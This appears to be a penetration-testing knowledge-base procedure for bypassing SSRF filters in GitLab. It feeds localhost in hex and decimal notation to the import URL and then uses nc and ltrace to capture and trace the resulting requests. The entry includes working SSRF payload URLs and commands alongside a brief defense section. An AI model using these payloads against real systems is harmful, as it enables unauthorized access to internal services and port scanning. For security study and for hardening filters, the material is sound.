---
id: proc-uuid-3
tags:
  - ssrf
  - hex-ip
  - decimal-ip
  - bypass
type: procedure
tools:
  - '[[tools/ltrace]]'
  - '[[tools/ping]]'
  - '[[tools/nc]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/ruby-resolv-hex-ip]]'
  - '[[commands/ruby-resolv-decimal-ip]]'
  - '[[commands/ltrace-ping-decimal-ip]]'
  - '[[commands/nc-listen-port-80]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:08:48.684Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Bypass-SSRF-Filters-with-Hex-and-Decimal-IPs

## Summary

This procedure extends the SSRF exploit by using hexadecimal (0x7f.1) and decimal (2130706433) IP notations for localhost, repeating imports to scan additional ports and capture responses.

## Description

Similar to octal, hex and decimal forms are not resolved by Resolv.getaddresses (empty array), bypassing filters, but resolved by OS inet_aton. This allows targeting various ports (e.g., 80) and setting up listeners to interact with the SSRF traffic for deeper reconnaissance.

## Requirements

1. Successful octal test from prior procedure
2. Local setup for listeners and tracing
3. GitLab instance with same vulnerability

## Defense

Defensive measures and detection strategies:

- Use Addrinfo.getaddrinfo instead of Resolv for comprehensive validation
- Block URLs with hex/octal/decimal patterns at input
- Monitor for patterns like 0x7f or large decimal IPs in logs

## Objectives

1. Exploit multiple bypass variants for broader port access
2. Capture SSRF requests using local servers
3. Demonstrate inconsistent resolution across notations

## Instructions

### Step 1: Test Hex Resolution

**Context**: Verify Resolv failure for hex notation.

**Command** ([[commands/ruby-resolv-hex-ip]]):
```ruby
require "resolv"; Resolv.getaddress "0x7f.1"
```

> Expected: Resolv::ResolvError: no address for 0x7f.1.

### Step 2: Trigger Import with Hex/Decimal

**Context**: Import using `http://0x7f.1:22/` or `http://2130706433:80/`.

**Command** ([[commands/import-url-hex]]):
```bash
# GitLab UI: Import URL: http://0x7f.1:22/ or http://2130706433:80/
```

> Expect similar connection reset errors confirming SSRF.

### Step 3: Setup Listener and Trace

**Context**: Listen on target port and trace OS resolution.

**Command** ([[commands/nc-listen-port-80]]):
```bash
echo -e "HTTP/1.1 200 OK\n\nHello from netcat :)" | sudo nc -l 80
```

> Then trace decimal: [[commands/ltrace-ping-decimal-ip]]

```bash
ltrace ping 2130706433 2>&1 | grep 2130706433
```

> Expected: inet_aton resolving to 127.0.0.1; listener captures request if port matches.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Active Scanning]] Active Scanning

### Sub-Techniques


## Commands Used

- [[commands/ruby-resolv-hex-ip]]
- [[commands/ruby-resolv-decimal-ip]]
- [[commands/ltrace-ping-decimal-ip]]
- [[commands/nc-listen-port-80]]

## Tools Used

- [[tools/ruby]]
- [[tools/ltrace]]
- [[tools/ping]]
- [[tools/nc]]

## Tags

- hex-bypass
- decimal-bypass
- port-scan

